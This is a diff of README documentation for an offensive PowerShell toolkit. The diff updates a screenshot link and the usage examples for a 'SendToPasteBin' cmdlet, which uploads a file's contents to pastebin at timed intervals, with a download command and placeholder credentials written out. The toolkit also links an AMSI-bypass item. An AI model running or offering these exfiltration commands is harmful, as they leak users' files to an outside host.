@@ -39,7 +39,7 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Out-Fi
    
 |Cmdlet Name|Description|Privileges|Notes|
 |---|---|---|---|
-|SendToPasteBin|Get filepath contents and paste it to pastebin.|User Land||[Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Ams1-Bypass/Disable-Amsi.png)|
+|SendToPasteBin|Get filepath contents and paste it to pastebin.|User Land||[Screenshot](https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Out-FileFormat/SendToPasteBin.png)|
 
 **download cmdLet:**
 ```powershell
@@ -57,8 +57,8 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Out-Fi
 Get-Help .\SendToPasteBin.ps1 -full
 
 #Get the contents of -filepath 'string' and creates a new pastebin paste from it on the sellected pastebin account.
-.\SendToPasteBin.ps1 -FilePath "test.log" -PastebinUsername "r00t-3xp10it" -PastebinPassword "MyS3cr3TPassword"
+.\SendToPasteBin.ps1 -FilePath "test.log" -maxpastes "1" -timeout "2" -PastebinUsername "r00t-3xp10it" -PastebinPassword "MyS3cr3TPassword"
 
 #Get the contents of -filepath 'string' and creates a new pastebin paste from it each 120 seconds a max of 10 pastes on the sellected pastebin account.
-.\SendToPasteBin.ps1 -FilePath "test.log" -timeout "120" -maxpastes "10" -PastebinUsername "r00t-3xp10it" -PastebinPassword "MyS3cr3TPassword"
+.\SendToPasteBin.ps1 -FilePath "test.log" -maxpastes "10" -timeout "120" -PastebinUsername "r00t-3xp10it" -PastebinPassword "MyS3cr3TPassword"
 ```   
